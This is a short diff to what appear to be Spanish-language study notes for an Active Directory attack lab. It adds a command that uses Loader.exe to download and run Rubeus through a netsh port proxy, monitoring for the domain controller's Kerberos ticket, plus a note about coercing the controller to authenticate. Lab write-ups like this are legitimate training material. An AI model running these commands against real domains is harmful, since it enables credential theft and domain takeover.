@@ -1196,9 +1196,10 @@ winrs -r:dcorp-appsrv cmd
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
 ```
 ```shell
-
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 
+Ahora en la maquina estudiante forzaremos la autenticacion de *dcorp-dc$* 
 
 
 
